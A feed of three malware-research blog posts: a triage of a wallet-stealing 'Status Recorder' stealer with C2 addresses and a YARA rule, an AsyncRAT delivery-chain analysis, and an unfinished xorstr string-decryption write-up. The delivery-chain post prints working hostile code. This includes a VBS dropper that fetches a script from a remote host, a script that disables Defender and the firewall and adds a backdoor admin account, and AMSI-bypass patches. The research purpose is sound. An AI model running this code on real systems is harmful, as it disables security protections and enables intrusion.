{
  
    
        "post0": {
            "title": "Status Recorder",
            "content": "Overview . The name of this stealer is currently unknown but the C2 hosts a panel that is titled Status Recorder. . . We first became aware of this from a tweet by @Jane_0sint tweet . UnkStealerü§∑‚Äç‚ôÄÔ∏è There is TitanStealer activity on these addresses, but the traffic structure and so on is very different from it. And the port is not 5000. 94.142.138[.]139 77.91.77[.]35 94.142.138[.]145 94.142.138[.]10 Ports:5001/5005https://app.any.run/tasks/0e933ce9-f531-401d-8d07-f518cdd9e2e1/ . Following up @AnFam17 posted a tweet with a list of related hashes. . 021db62d85d6e92e5c67fc9b06c87bf1 41f39df6d7243675e36805d9a591c350 39e7dc7f0cfa0ef6b646e794161d91a7 cc2f69864386e81eb527119f82713ccf 02398b35b4fa068d16806315eb423048 e22ef641c2d1600af204690c5ed50286 d9063ce4b74ca71cc661652603bca980 5acd73c4f3ee93180a7609a4d4458e91 f9b6aa6b0694cc878ed1cc0f7f4c9e63 f7b081d241439f7724222383473b1e2c 4573409d7e3578ecba9150cbf2158325 b0b7bbbc9e3dae849c750202db747f03 c03058303988c6f7992b38bda6804b9d 3d8e4db9f27659078528b3c69b6d6669 12ab2d4a70aefdb1dc7936518bc6258c ebbfe27eddcaf5d651672aeb10c55302 f6f9457ba5ee5dcae89106b29b7f036a 14a8ec5c9448d6fecb58f04879237163 16f2a3898cdc27798158c9bf35a4eff4 d2cfc8672bcccb34f7f511901951494b 4587d9fde0fc6ad5decaaf9b391ebd5b . Panel Hunt . Thanks to @LLxynLL we also have a nice google dork that can be used to hunt the panels. . intitle:&quot;status recorder&quot; intext:&quot;start spy&quot; . Samples . 032c59d8a9364ce30ded3ef4aa5cd6b6d632d1fcd994c03de02088db247e7d2d packed 7cdae8e3531a0ad631e07f351cb485065a697a147c431b5ddf97facfbfc10bf0 unpacked | . | f476c1562bd503892b3219dff369a6f0a20eb667484237d380645d65dfd5a765 packed 830551aa368f53639f87284ec8bcdba971b8c58764154b5cdd54bd86ad5d1d72 unpacked | . | . Prior Research . @r0ny_123 found a potential link between StatusRecorder Erbium Stealer . 41f39df6d7243675e36805d9a591c350 (StatusRecorder) @0x401a1e, @0x401aa3, @0x401b77 | 0541c00dc6b29c795cdc242f36e44ad6 (Erbium Stealer) @0x444639, @0x4446be, @0x4446be | . Further investigation shows that these functions are dynamic API resolving using fnv1 (LoadLibraryA, GetProcAddress). . Also EmergingThreats created a snort rule for the traffic. . Analysis . Panel Analysis . Thanks to @__fastcall&#39;s over 1000000 hours on CSGO he noticed that the background from the panel is from CSGO! And @TheAifam5&#39;s sharp eyes found the exact scene! . . Logo Overlap Coincidence . The stealer panel logo overlaps with a breach detection application. This could be a coincidence as other versions of the logo are used for unrelated applications but there are some interesting coincidences that we are going to investigate. . . Breach directory logo 1 | Breach directory application (modified logo) | The breach directory developer has a github where he has multiple projects related to malware development including file binders and keyloggers. | Interesting note he also commented on a CSGO cheat thread suggesting that he had built an injector for a CSGO cheat. | Some of his github projects have been built and tested on ANYRUN giving us insight into his build path C: Users rohan Downloads File-Binder-Pro-master File-Binder-Pro-master File-Binder-Pro-master Dream AIO obj Debug File Binder Pro.pdb | . This is likely a coincidence we are just capturing this information on record until more data is found either confirming or refuting the link. . Malware Identification . C2 Traffic . The stolen data is exfiltrated using $$$$ keywords and the data itself is base64 encoded. This is a recursive structure. . $$$$$$WALLETS_START$$$$$$ JCQkJCRERVNLV0FMTEVUU19TVEFSVCQkJCQkCiQkJCQkREVTS1dBTExFVFNfRU5EJCQkJCQK $$$$$$WALLETS_END$$$$$$ . The C2 IP is hard coded in the binary 77.91.77.35$$$$ the $$$ appended to it is possibly as some type of obfuscation? The port is also hard coded in this case it is 5001. This is connected to via a raw TCP socket, the HTTP protocol is not used. . TitanStealer also uses this $$$ formatting but it could be coincidence A7DFB6BB7CA1C8271570DDCF81BB921CF4F222E6E190E5F420D4E1EDA0A0C1F2 . .rdata:0051141C db &#39;tipodomain$$$$$$$$$$$$$$$$$&#39; .rdata:00511437 db &#39;installs$$$$$$$$$$$$$$$$$$$&#39; .rdata:00511452 db &#39;darkcorner$$$$$$$$$$$$$$$$$&#39; . PDB Path Hunting . 5e72f0741d29914843c91b9daed3256c5c5e8c73f8a7cbfc20cb8a9c06775833 contains C: Users admin source repos MemLoader x64 Release MemLoader.pdb . Yara Rule . rule StatusRecorder { strings: $s1 = &quot;$$$$$$FILEGRABBER_FILE_&quot; ascii $s2 = &quot;$$$$$$WALLETCORE_START$$$$$$&quot; ascii $s3 = &quot;$$$$$$WALLETCORE_FILE_&quot; ascii $s4 = &quot;$$$$$$WALLETCORE_END$$$$$$&quot; ascii $s5 = &quot;$$$$$$WALLET_START_BINANCE$$$$$$&quot; ascii $s6 = &quot;$$$$$BINANCE_FILE_&quot; ascii $s7 = &quot;$$$$$$WALLET_END_BINANCE$$$$$$&quot; ascii $s8 = &quot;$$$$$$WALLET_START_EXODUS$$$$$$&quot; ascii $s9 = &quot;$$$$$EXODUS_FILE_&quot; ascii $s11 = &quot;$$$$$$WALLET_END_EXODUS$$$$$$&quot; ascii $s12 = &quot;$$$$$$WALLET_START_ATOMIC$$$$$$&quot; ascii $s13 = &quot;$$$$$ATOMIC_FILE_&quot; ascii $s14 = &quot;$$$$$$WALLET_END_ATOMIC$$$$$$&quot; ascii $s15 = &quot;$$$$$$WALLET_START_ARMORY$$$$$$&quot; ascii $s16 = &quot;$$$$$ARMORY_FILE_&quot; ascii $s17 = &quot;$$$$$$WALLET_END_ARMORY$$$$$$&quot; ascii $s18 = &quot;$$$$$$WALLET_START_COINOMI$$$$$$&quot; ascii $s19 = &quot;$$$$$COINOMI_FILE_&quot; ascii $s20 = &quot;$$$$$$WALLET_END_COINOMI$$$$$$&quot; ascii $s21 = &quot;$$$$$$WALLET_START_ETHEREUM$$$$$$&quot; ascii $s22 = &quot;$$$$$ETHEREUM_FILE_&quot; ascii $s23 = &quot;$$$$$$WALLET_END_ETHEREUM$$$$$$&quot; ascii $s24 = &quot;$$$$$$WALLET_START_ZCASH$$$$$$&quot; ascii $s25 = &quot;$$$$$ZCASH_FILE_&quot; ascii $s26 = &quot;$$$$$$WALLET_END_ZCASH$$$$$$&quot; ascii $s27 = &quot;$$$$$$WALLET_START_JAXX$$$$$$&quot; ascii $s28 = &quot;$$$$$JAXX_FILE_&quot; ascii $s29 = &quot;$$$$$$WALLET_END_JAXX&quot; ascii $s30 = &quot;GRABPATH_CONF$$$$$$$$$$$$$$$&quot; ascii $code = {558b ec8b 81 ?? ?? ?? ?? 85 c074 ?? 4033 d289 81 ?? ?? ?? ?? 85 c07e } condition: 20 of ($s*) or $code } .",
            "url": "https://research.openanalysis.net/status%20recorder/stealer/config/triage/2023/07/06/status-recorder.html",
            "relUrl": "/status%20recorder/stealer/config/triage/2023/07/06/status-recorder.html",
            "date": " ‚Ä¢ Jul 6, 2023"
        }
        
    
  
    
        ,"post1": {
            "title": "Triage Malware Delivery Chain",
            "content": "Overview . We are going to analyze a multi-stage delivery chain that ends up delivering AsyncRAT. This delivery chain has multiple stages that are responsible for preparing the target host for the delivery of the malware such that the host will likely not detect the final payload. . The sample comes from @james_inthe_box . https://twitter.com/James_inthe_box/status/1674105216575373312?s=20 . Samples . 8661bf09583ac5882e4183052c4273c267711236b79aeecf3e3fd1ac0da6376e | . Analysis . Stage 1 - VBS Script . &#39;Hi, This is a good day for me and you , GoodBye ‚ô• on error resume next Function YEKOQ(HIZHA,Path) Set Req = CreateObject(&quot;Msxml2.XMLHttp.6.0&quot;) Req.Open &quot;GET&quot;, HIZHA, False Req.send CKDPR = Replace(Req.responseText, &quot;BinaryChange&quot;, GJQBQ()) If Req.Status = 200 Then HSHOG Path,CKDPR End If End Function function GJQBQ() GJQBQ = Replace(&quot;removed_pe_file&quot;,&quot;imHope&quot;,&quot;00&quot;) end function Sub SCLBY(MQTSY) Dim TZPXW Set TZPXW = CreateObject(&quot;Scripting.FileSystemObject&quot;) TZPXW.DeleteFile(MQTSY) End Sub Sub HSHOG(ByVal MRADA, ByVal CCGCV) On Error Resume Next Dim XRJWL, UKUZG Set XRJWL = CreateObject(&quot;Scripting.FileSystemObject&quot;) If XRJWL.FileExists(MRADA) Then Set UKUZG = XRJWL.OpenTextFile(MRADA, 8, True) Else Set UKUZG = XRJWL.CreateTextFile(MRADA, True) End If If Err &lt;&gt; 0 Then Err.Clear On Error Goto 0 Exit Sub End If UKUZG.WriteLine CCGCV UKUZG.Close Err.Clear On Error Goto 0 End Sub Function CCFRA(DOJVJ) HSHOG DOJVJ,&quot;PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command %cd% BJUEL.ps1&quot; End Function Function YSLLW(FPMNG) HSHOG FPMNG,&quot;on error resume next&quot; HSHOG FPMNG,&quot;Set TLZDH = WScript.CreateObject(&quot;&quot;WScript.Shell&quot;&quot;)&quot; HSHOG FPMNG,&quot;APPDATA = TLZDH.ExpandEnvironmentStrings(&quot;&quot;%appdata% WindowsServices&quot;&quot;)&quot; HSHOG FPMNG,&quot;WScript.Sleep(3000)&quot; HSHOG FPMNG,&quot; Set JXQIF = CreateObject(&quot;&quot;Shell.Application&quot;&quot;)&quot; HSHOG FPMNG,&quot;JXQIF.ShellExecute APPDATA &amp; &quot;&quot; DOJVJ.cmd&quot;&quot;, &quot;&quot;&quot;&quot;, APPDATA, &quot;&quot;&quot;&quot;, 0&quot; End Function Function IBJWI(YDIAV) Dim LXUUK, FPJYO Set LXUUK = CreateObject(&quot;Scripting.FileSystemObject&quot;) Set FPJYO = LXUUK.CreateFolder(YDIAV) IBJWI = FPJYO.Path End Function Function TAWBD(AFOVN) Dim LXUUK, EZIMG Set LXUUK = CreateObject(&quot;Scripting.FileSystemObject&quot;) set EZIMG = LXUUK.GetFile(AFOVN) EZIMG.attributes = EZIMG.attributes + 4 EZIMG.attributes = EZIMG.attributes + 2 end Function Function YRVPO(AFOVN,HOCKL) Set JXQIF = CreateObject(&quot;Shell.Application&quot;) JXQIF.ShellExecute AFOVN, &quot;&quot;, HOCKL, &quot;&quot;, 0 end Function function AGJZU(AFOVN,FPMNG) Set MMCVF = WScript.CreateObject(&quot;WScript.Shell&quot;) DTHQX = MMCVF.ExpandEnvironmentStrings(AFOVN) Set oLink = MMCVF.CreateShortcut(DTHQX) oLink.TargetPath = MMCVF.ExpandEnvironmentStrings(FPMNG) oLink.Save end function function XCKPZ() On Error Resume Next If Not WScript.Arguments.Named.Exists(&quot;elevate&quot;) Then CreateObject(&quot;Shell.Application&quot;).ShellExecute WScript.FullName, &quot;&quot;&quot;&quot; &amp; WScript.ScriptFullName &amp; &quot;&quot;&quot; /elevate&quot;, &quot;&quot;, &quot;runas&quot;, 1 WScript.Quit End If On Error Resume Next WScript.Sleep(1000) With CreateObject(&quot;WScript.Shell&quot;) .Run &quot;powershell -Command Add-MpPreference -ExclusionPath &#39;%Appdata%&#39;&quot;, 0, True .Run &quot;powershell -Command Add-MpPreference -ExclusionExtension &#39;.vbs&#39;&quot;, 0, True End With WScript.Sleep 100 end function function ALBME() Set oFso = CreateObject(&quot;Scripting.FileSystemObject&quot;) : oFso.DeleteFile Wscript.ScriptFullName, True end function XCKPZ() &#39;ALBME() Dim TLZDH Set TLZDH = WScript.CreateObject(&quot;WScript.Shell&quot;) APPDATA = TLZDH.ExpandEnvironmentStrings(&quot;%appdata% WindowsServices&quot;) STARTUP = TLZDH.ExpandEnvironmentStrings(&quot;%USERPROFILE% Start Menu Programs Startup&quot;) strCurDir = TLZDH.CurrentDirectory IBJWI(APPDATA) SCLBY(APPDATA &amp; &quot; DOJVJ.cmd&quot;) CCFRA(APPDATA &amp; &quot; DOJVJ.cmd&quot;) TAWBD(APPDATA &amp; &quot; DOJVJ.cmd&quot;) SCLBY(STARTUP &amp; &quot; FPMNG.vbs&quot;) YSLLW(STARTUP &amp; &quot; FPMNG.vbs&quot;) TAWBD(STARTUP &amp; &quot; FPMNG.vbs&quot;) SCLBY(STARTUP &amp; &quot; WindowsServices-MMCVF.lnk&quot;) AGJZU STARTUP &amp; &quot; WindowsServices-MMCVF.lnk&quot;,STARTUP &amp; &quot; FPMNG.vbs&quot; HIZHA = &quot;http://tiny23.duckdns.org/paste.txt&quot; SCLBY(APPDATA &amp; &quot; BJUEL.ps1&quot;) YEKOQ HIZHA,APPDATA &amp; &quot; BJUEL.ps1&quot; TAWBD(APPDATA &amp; &quot; BJUEL.ps1&quot;) WScript.Sleep(5000) YRVPO APPDATA &amp; &quot; DOJVJ.cmd&quot;,APPDATA . Stage 2 - PS Script . The script is downloaded from http[:]//tiny23.duckdns[.]org/paste.txt and contains three encoded data strings. . 12599f668d7d7bfa6882e4f78f3523c14c7e5d02ee1f7d0379d17878caf91e07 . PS Script to kill Defender and setup env | PS Script to bypass AMSI | Binary .NET injector | . try { } catch { } start-sleep 3 Function asjdiwWWWW($Yatak) { $byteList = [System.Collections.Generic.List[Byte]]::new() for ($i = 0; $i -lt $Yatak.Length; $i +=8) { $byteList.Add([Convert]::ToByte([String] $Yatak.Substring($i, 8), 2)) } return [System.Text.Encoding]::ASCII.GetString($byteList.ToArray()) } Function holakabutr([String] $IN) { $RNBX1 = $IN.Replace(&#39;~&#39;,&#39;000&#39;).Replace(&#39;%&#39;,&#39;4&#39;) $bytes = New-Object -TypeName byte[] -ArgumentList ($RNBX1.Length / 1+1+0) for ($i = 0; $i -lt $RNBX1.Length; $i += 1+1+0) { $bytes[$i / 2] = [Convert]::ToByte($RNBX1.Substring($i, 1+1+0), 6+10+0) } return [byte[]]$bytes } start-sleep 3 $CLE11 = &#39;&#39; $CLE11 = &#39;BinaryChange&#39; $RNBX1 = &#39;pe_file_removed&#39; $tempfolder = $env:temp $destinazione = $tempfolder + &quot; RegSvcs.exe&quot; $Path = &#39;C: Windows Microsoft.NET Framework v4.0.30319 RegSvcs.exe&#39; Copy-Item $Path -Destination $destinazione Function MyFunciton($Var) { return $Var.GetType(&#39;CALC.PAYSIAS&#39;) } try { [byte[]]$WULC4 = holakabutr($CLE11) [byte[]]$YIV4Z = holakabutr($RNBX1) $execute = (asjdiwWWWW(&quot;%1%%%1%1%1111%%%%11%%1%1%11%%%11%111%1%1%111%1%%%11%%1%1&quot;.Replace(&#39;%&#39;,&#39;0&#39;))) $invoke = (asjdiwWWWW(&quot;0%00%00%0%%0%%%00%%%0%%00%%0%%%%0%%0%0%%0%%00%0%&quot;.Replace(&#39;%&#39;,&#39;1&#39;))) $Path = $destinazione $Path2 = &#39;&#39; $Path3 = &#39;&#39; try { $ncr3 = [Ref].Assembly $ncrx3 = $ncr3::Load(($YIV4Z)) $TXN4Z = MyFunciton($ncrx3); $MG5X = $TXN4Z.&#39;GetMethod&#39;($execute); } catch { } try { } catch { } try { $MG5X.$invoke($null,[object[]] ($Path.Replace(&quot;%%&quot;,&quot;&quot;),$WULC4)); $MG5X.$invoke($null,[object[]] ($Path2.Replace(&quot;%%&quot;,&quot;&quot;),$WULC4)); $MG5X.$invoke($null,[object[]] ($Path3.Replace(&quot;%%&quot;,&quot;&quot;),$WULC4)); $OASI4 = (asjdiwWWWW(&quot;ps_script_1&quot;.Replace(&#39;~&#39;,&#39;0&#39;).Replace(&#39;%&#39;,&#39;1&#39;))) $OASI4 | .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;lun&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;lun&#39;,&#39;EX&#39;) $DEF = (asjdiwWWWW(&quot;ps_script_2&quot;.Replace(&#39;~&#39;,&#39;0&#39;).Replace(&#39;%&#39;,&#39;1&#39;))) $DEF | .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;lun&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;lun&#39;,&#39;EX&#39;) } catch { } } catch { } . Stage 3 . PS Script 1 - Kill Windows Defender . Add-MpPreference -ExclusionExtension &quot;.bat&quot; Add-MpPreference -ExclusionExtension &quot;.ppam&quot; Add-MpPreference -ExclusionExtension &quot;.xls&quot; Add-MpPreference -ExclusionExtension &quot;.bat&quot; Add-MpPreference -ExclusionExtension &quot;.exe&quot; Add-MpPreference -ExclusionExtension &quot;.vbs&quot; Add-MpPreference -ExclusionExtension &quot;.js&quot; Add-MpPreference -ExclusionPath C: Add-MpPreference -ExclusionPath D: Add-MpPreference -ExclusionPath E: Add-MpPreference -ExclusionPath C: ProgramData MEMEMAN Add-MpPreference -ExclusionProcess explorer.exe Add-MpPreference -ExclusionProcess kernel32.dll Add-MpPreference -ExclusionProcess aspnet_compiler.exe Add-MpPreference -ExclusionProcess cvtres.exe Add-MpPreference -ExclusionProcess CasPol.exe Add-MpPreference -ExclusionProcess csc.exe Add-MpPreference -ExclusionProcess Msbuild.exe Add-MpPreference -ExclusionProcess ilasm.exe Add-MpPreference -ExclusionProcess InstallUtil.exe Add-MpPreference -ExclusionProcess jsc.exe Add-MpPreference -ExclusionProcess Calc.exe Add-MpPreference -ExclusionProcess powershell.exe Add-MpPreference -ExclusionProcess rundll32.exe Add-MpPreference -ExclusionProcess mshta.exe Add-MpPreference -ExclusionProcess cmd.exe Add-MpPreference -ExclusionProcess DefenderisasuckingAntivirus Add-MpPreference -ExclusionProcess wscript.exe Add-MpPreference -ExclusionIpAddress 127.0.0.1 Add-MpPreference -ThreatIDDefaultAction_Actions 6 Add-MpPreference -AttackSurfaceReductionRules_Ids 0 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend Set-MpPreference -EnableControlledFolderAccess Disabled Set-MpPreference -PUAProtection disable Set-MpPreference -HighThreatDefaultAction 6 -Force Set-MpPreference -ModerateThreatDefaultAction 6 Set-MpPreference -LowThreatDefaultAction 6 Set-MpPreference -SevereThreatDefaultAction 6 Set-MpPreference -ScanScheduleDay 8 New-Ipublicroperty -Path HKLM:Software Microsoft Windows CurrentVersion policies system -Name EnableLUA -PropertyType DWord -Value 0 -Force Stop-Service -Name WinDefend -Confirm:$false -Force Set-Service -Name WinDefend -StartupType Disabled net user System32 /add net user System32 123 net localgroup administrators System32 /add net localgroup &quot;Remote Desktop Users&quot; System32 /add net stop WinDefend net stop WdNisSvc sc delete windefend netsh advfirewall set allprofiles state off . Using the string DefenderisasuckingAntivirus we can pivot and identify previous uses of the script Deja Vu All Over Again: Tax Scammers at Large | . | . PS Script 2 - Bypass AMSI . start-sleep 23 # Disable Script Logging: $settings = [Ref].Assembly.GetType(&quot;System.Management.Automation.Utils&quot;).GetField(&quot;cachedGroupPolicySettings&quot;,&quot;NonPublic,Static&quot;).GetValue($null); $settings[&quot;HKEY_LOCAL_MACHINE Software Policies Microsoft Windows PowerShell ScriptBlockLogging&quot;] = @{} $settings[&quot;HKEY_LOCAL_MACHINE Software Policies Microsoft Windows PowerShell ScriptBlockLogging&quot;].Add(&quot;EnableScriptBlockLogging&quot;, &quot;0&quot;) # Matt Graebers Reflection method: [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true) # Forcing an error: $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076) [Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiSession&quot;,&quot;NonPublic,Static&quot;).SetValue($null, $null);[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiContext&quot;,&quot;NonPublic,Static&quot;).SetValue($null, [IntPtr]$mem) start-sleep 12 $Win32 = @&quot; using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(&quot;kernel32&quot;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(&quot;kernel32&quot;)] public static extern IntPtr LoadLibrary(string name); [DllImport(&quot;kernel32&quot;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } &quot;@ Add-Type $Win32 $LoadLibrary = [Win32]::LoadLibrary(&quot;am&quot; + &quot;si.dll&quot;) $Address = [Win32]::GetProcAddress($LoadLibrary, &quot;AmsiScanBuffer&quot;) $p = 0 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6) start-sleep 7 $ZQCUW = @&quot; using System; using System.Runtime.InteropServices; public class ZQCUW { [DllImport(&quot;kernel32&quot;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(&quot;kernel32&quot;)] public static extern IntPtr LoadLibrary(string name); [DllImport(&quot;kernel32&quot;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } &quot;@ Add-Type $ZQCUW $BBWHVWQ = [ZQCUW]::LoadLibrary(&quot;amsi.dll&quot;) $XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, &quot;AmsiScanBuffer)&quot;) $p = 0 [ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p) $TLML = &quot;0xB8&quot; $PURX = &quot;0x57&quot; $YNWL = &quot;0x00&quot; $RTGX = &quot;0x07&quot; $XVON = &quot;0x80&quot; $WRUD = &quot;0xC3&quot; $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD) [System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6) . AMSI Bypass . The difference between Powershell only &amp; process specific AMSI bypasses . This patches out AmsiScanBuffer with an error return code 0x80070057&#39; &#39;parameter is incorrect. . B8 57 00 07 80 mov eax, 0x80070057 C3 ret . .NET Injector . 7142f2f2e3a0e56757d17d174df76b44a5bf41ef76d084c38f123ea660c31ee7 . protected with a free version of .net reactor which can be removed with de4dot | simple process injector | .",
            "url": "https://research.openanalysis.net/delivery/triage/powershell/vbs/dotnet/2023/07/02/multichain-delivery.html",
            "relUrl": "/delivery/triage/powershell/vbs/dotnet/2023/07/02/multichain-delivery.html",
            "date": " ‚Ä¢ Jul 2, 2023"
        }
        
    
  
    
        ,"post2": {
            "title": "XORSTR Generic String Decryption",
            "content": "Overview . The open source string encryption library xorstr has been adopted by multiple malware developers (as well as slight variations on the same technique). The string encryptor makes use of the xmm/ymm registers and pxor pvxor instructions to decrypt stack strings. In the words of the developer... . All keys are 64bit and generated during compile time. | Data blocks go in increments of 16 bytes so some space may be wasted. | The code has been crafted so that all the data would be embedded directly into code and not stored on .rdata and such. | The entirety of string encryption and decryption will be inlined. . The following is an example of the library in use. . | . .text:00411E14 C7 44 24 08 25 7B 87 92 mov [esp+60h+var_58], 92877B25h .text:00411E1C 0F 57 C0 xorps xmm0, xmm0 .text:00411E1F C7 44 24 0C B6 10 A7 1F mov [esp+60h+var_54], 1FA710B6h .text:00411E27 8B 44 24 08 mov eax, [esp+60h+var_58] .text:00411E2B 8B 4C 24 0C mov ecx, [esp+60h+var_54] .text:00411E2F 89 44 24 10 mov dword ptr [esp+60h+var_50], eax .text:00411E33 89 4C 24 14 mov dword ptr [esp+60h+var_50+4], ecx .text:00411E37 C7 44 24 08 D1 77 20 5B mov [esp+60h+var_58], 5B2077D1h .text:00411E3F C7 44 24 0C C5 36 32 7E mov [esp+60h+var_54], 7E3236C5h .text:00411E47 8B 44 24 08 mov eax, [esp+60h+var_58] .text:00411E4B 8B 4C 24 0C mov ecx, [esp+60h+var_54] .text:00411E4F 89 44 24 18 mov dword ptr [esp+60h+var_50+8], eax .text:00411E53 89 4C 24 1C mov dword ptr [esp+60h+var_50+0Ch], ecx .text:00411E57 C7 44 24 08 6D 1E EB FE mov [esp+60h+var_58], 0FEEB1E6Dh .text:00411E5F C7 44 24 0C D9 3C 87 48 mov [esp+60h+var_54], 48873CD9h .text:00411E67 8B 44 24 08 mov eax, [esp+60h+var_58] .text:00411E6B 8B 4C 24 0C mov ecx, [esp+60h+var_54] .text:00411E6F C7 44 24 08 BE 05 4C 3F mov [esp+60h+var_58], 3F4C05BEh .text:00411E77 89 44 24 40 mov dword ptr [esp+60h+var_20], eax .text:00411E7B C7 44 24 0C E4 36 32 7E mov [esp+60h+var_54], 7E3236E4h .text:00411E83 8B 44 24 08 mov eax, [esp+60h+var_58] .text:00411E87 89 4C 24 44 mov dword ptr [esp+60h+var_20+4], ecx .text:00411E8B 8B 4C 24 0C mov ecx, [esp+60h+var_54] .text:00411E8F 89 44 24 48 mov dword ptr [esp+60h+var_20+8], eax .text:00411E93 8D 44 24 10 lea eax, [esp+60h+var_50] .text:00411E97 89 4C 24 4C mov dword ptr [esp+60h+var_20+0Ch], ecx .text:00411E9B 8D 50 01 lea edx, [eax+1] .text:00411E9E 0F 28 4C 24 40 movaps xmm1, [esp+60h+var_20] .text:00411EA3 66 0F EF 4C 24 10 pxor xmm1, [esp+60h+var_50] .text:00411EA9 0F 29 4C 24 10 movaps [esp+60h+var_50], xmm1 .text:00411EAE 0F 29 44 24 20 movaps [esp+60h+var_40], xmm0 .text:00411EB3 C7 44 24 30 00 00 00 00 mov [esp+60h+var_30], 0 .text:00411EBB C7 44 24 34 00 00 00 00 mov [esp+60h+var_2C], 0 . Samples . maybe cheat 92394d5c170060b09ba4ffba450f44d5d4387693a00ee1aba910a818fa387b31 | . | metastealer 6cf8bfba1b221effcb1eccec0c91fb0906d0b8996932167f654680cb3ac53aac | . | meduza stealer x64 2ad84bfff7d5257fdeb81b4b52b8e0115f26e8e0cdaa014f9e3084f518aa6149 | . | meduza stealer x32 29cf1ba279615a9f4c31d6441dd7c93f5b8a7d95f735c0daa3cc4dbb799f66d4 | . | mpress unpacked risepro 16ae203879efe1912bb8b97ceb0f4645abcde27a987e98a171d59f9c1ec3f764 | . | privateloader 1aa2d32ab883de5d4097a6d4fe7718a401f68ce95e0d2aea63212dd905103948 | . | rise pro 2cd2f077ca597ad0ef234a357ea71558d5e039da9df9958d0b8bd0efa92e74c9 | . | . Prior Work . There have been a few attempts at decrypting strings from malware that use this library (or a variation of the technique). While these are good references they don&#39;t cover all of the cases in a generic way which is our goal. There is also an IDA script that attempts to decrypt the library but we didn&#39;t have any success with it. . X-Junior IDA Script . X-Junior has a script that we can try in IDA to decrypt these strings: GitHub Repo. . Andre Tavares Python Script . andretavare5 has a python script using capstone to decrypt the strings: Script Gist. We have created our own hybrid of the two, which uses capstone for disassembly, but implements the logic from the IDA script. . IDA Xorstr Decryption Plugin . ida-jm-xorstr-decrypt-plugin. This plugin was made to directly attack the xorstr library but it is x64 only and in testing we could not get it to work reliably. . aimware_deobf_str . aimware_deobf_str is a similar approach using RUST! lol. . Regex and Dissassembly Approach . Our first attempt at decryption uses a regex to identify the pxor/pvxor instructions then disassembles a small chunk of surrounding code which is then scanned for the stack string mov immediate pattern. We also use a recursive search for mov where there is an intermediate register or temporary memory location used to store the immediate before it is moved into place. . Decryption Algorithm . select the first section in the PE file, assume this is the code | scan code for final pxor instruction and truncate at this instruction to remove extra code from scanning (handle packers with large first sections) | linear disassemble the prior 0x400 bytes of code - not efficient | traverse assembly until pxor instruction is located | scan backwards until all immediate data is located for the xmm registers | decrypt xmm data, this is the string chunk | . Limitations . In some cases we end up re-dissassembling the same code again and again | The 0x400 bytes is an arbitrary number and might miss some of the string setup if there is a re-used chunk in a register (risepro) | The dissassembly can sometimes be misaligned | The DWORD chunks are sometimes moved into place out of order, without tracking displacement we cannot correct this | . Possible Improvements . Run full regex scan upfront and split binary into chunks based on the largest amount of code that covers all pxor instructions and only disassemble each once. | Use the pxor instruction offset to check for alignment when disassembling (still prone to errors... maybe try the x64dbg test for max valid instructions, could be slow) | Instead of just scanning for mov instructions to collect the DWORD chunks use a recursive scan to track the displacement for each mov | . TODO . We still need to implement the optimization of only dissassembling big chunks of code the contain the strings instead of re-disassembling the same chunks again and again | We need to implement EBP shift tracing | We need to check for other types of ESP shift and handle them | We need to expand the xor types to handle more than pxor | We need to expand the xor operands to handle more than just a register and an memory address | BUGS Currently we are missing a few strings still for rise.bin (check the sql statements) | BUGS Our string builder sometimes adds strings that are seperate look for a better solution (tighter address spacing maybe, or something in the code???) | BUGS Doesn&#39;t work for priv.bin likely just need to handle more xor operands | . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . import pefile import struct from capstone import * from capstone.x86 import * import re import time import logging log_level = logging.ERROR # Create logger logger = logging.getLogger() logger.setLevel(log_level) # Create console handler and set level to error ch = logging.StreamHandler() ch.setLevel(log_level) # Create formatter formatter = logging.Formatter(&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;) # Add formatter to console handler ch.setFormatter(formatter) # Add console handler to logger logger.addHandler(ch) # Hack to clear handlers for jupyter notebook for h in logger.handlers: logger.removeHandler(h) def is_ascii(s): return all(c &lt; 128 or c == 0 for c in s) def string_builder(strings): out = [] last_addr = 0 last_string = &quot;&quot; for s in strings[::-1]: diff = last_addr - s[0] if diff &lt;= 98 and last_string is not None: last_string = s[1] + last_string else: out.append((last_addr,last_string)) last_string = s[1] last_addr = s[0] out.append((last_addr,last_string)) return out[::-1] def xor(data, key): out = [] for i in range(len(data)): 